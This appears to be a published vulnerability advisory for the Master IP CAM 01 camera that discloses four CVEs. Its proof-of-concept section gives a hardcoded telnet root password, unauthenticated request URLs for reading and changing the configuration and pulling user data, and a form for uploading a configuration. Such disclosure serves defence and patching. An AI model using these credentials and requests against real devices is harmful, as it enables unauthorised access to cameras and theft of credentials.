# Exploit Title: Master IP CAM 01 Multiple Vulnerabilities
# Date: 17-01-2018
# Remote: Yes
# Exploit Authors: Daniele Linguaglossa, Raffaele Sabato
# Contact: https://twitter.com/dzonerzy, https://twitter.com/syrion89
# Vendor: Master IP CAM
# Version: 3.3.4.2103
# CVE: CVE-2018-5723, CVE-2018-5724, CVE-2018-5725, CVE-2018-5726

I DESCRIPTION
========================================================================
The Master IP CAM 01 suffers of multiple vulnerabilities:

# [CVE-2018-5723] Hardcoded Password for Root Account
# [CVE-2018-5724] Unauthenticated Configuration Download and Upload
# [CVE-2018-5725] Unauthenticated Configuration Change
# [CVE-2018-5726] Unauthenticated Sensitive Information Disclousure


II PROOF OF CONCEPT
========================================================================

## [CVE-2018-5723] Hardcoded Password for Root Account

Is possible to access telnet with the hardcoded credential root:cat1029


## [CVE-2018-5724] Unauthenticated Configuration Download and Upload

Download:

http://192.168.1.15/web/cgi-bin/hi3510/backup.cgi

Upload Form:

### Unauthenticated Configuration Upload
<form name="form6" method="post" enctype="multipart/form-data"
action="cgi-bin/hi3510/restore.cgi" >
<input type="file" name="setting_file" >
<input type="submit" value="restore" >
</form>


## [CVE-2018-5725] Unauthenticated Configuration Change

Change configuration:

http://192.168.1.15/web/cgi-bin/hi3510/param.cgi?cmd=sethttpport&-httport=8080

List of available commands here:
http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf


## [CVE-2018-5726] Unauthenticated Sensitive Information Disclousure

Retrieve sensitive information:

http://192.168.1.15/web/cgi-bin/hi3510/param.cgi?cmd=getuser


III REFERENCES
========================================================================
http://syrion.me/blog/master-ipcam/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726
http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf